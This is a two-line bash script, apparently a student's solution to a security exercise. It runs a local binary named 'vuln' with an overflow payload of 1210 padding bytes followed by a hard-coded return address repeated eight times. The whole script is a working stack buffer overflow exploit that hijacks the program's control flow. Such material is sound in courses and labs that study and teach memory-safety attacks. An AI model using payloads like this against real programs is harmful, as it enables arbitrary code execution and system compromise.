#!/usr/bin/env bash
/task2/s1923864/vuln "$(python -c "print('A'*1210 + '\x36\x92\x04\x08'*8)")"